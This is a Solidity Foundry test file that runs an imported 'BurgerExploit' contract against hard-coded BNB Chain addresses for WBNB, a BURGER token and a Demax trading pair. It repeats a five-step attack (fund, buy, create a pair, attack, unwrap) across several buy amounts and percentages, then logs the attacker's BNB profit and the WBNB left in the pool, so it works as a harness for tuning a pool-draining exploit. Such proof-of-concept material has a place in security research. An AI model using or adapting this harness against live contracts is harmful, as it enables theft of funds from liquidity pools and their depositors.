// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest9 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;

    function test_10000_12() public { _run(10000 ether, 12); }
    function test_10000_15() public { _run(10000 ether, 15); }
    function test_10000_20() public { _run(10000 ether, 20); }
    function test_10000_25() public { _run(10000 ether, 25); }
    function test_10000_30() public { _run(10000 ether, 30); }
    function test_15000_5() public { _run(15000 ether, 5); }
    function test_15000_8() public { _run(15000 ether, 8); }
    function test_15000_10() public { _run(15000 ether, 10); }

    function _run(uint256 buyAmount, uint256 pairPct) internal {
        address att = makeAddr("att");
        uint256 startBnb = buyAmount + 500 ether;
        vm.deal(att, startBnb);
        vm.startPrank(att);

        BurgerExploit e = new BurgerExploit();
        e.step1_setup{value: buyAmount + 200 ether}();
        e.step2_buyBurger(buyAmount);

        uint256 bBal = IERC20(BURGER).balanceOf(address(e));
        uint256 forPair = bBal * pairPct / 100;

        e.step3_createPair(100 ether, forPair);
        e.step4_attack(50 ether);
        e.step5_unwrap();

        int256 profit = int256(att.balance) - int256(startBnb);
        string memory pSign = profit >= 0 ? "+" : "-";
        uint256 absProfit = profit >= 0 ? uint256(profit) : uint256(-profit);
        emit log_string(string.concat(
            "buy=", vm.toString(buyAmount / 1 ether),
            " pct=", vm.toString(pairPct),
            " profit=", pSign, vm.toString(absProfit / 1 ether), " BNB"
        ));

        address pair = 0x7ac55ac530f2C29659573Bde0700c6758D69e677;
        (,uint112 r1,) = IDemaxPair(pair).getReserves();
        emit log_named_uint("WBNB remaining", r1);

        vm.stopPrank();
    }
}
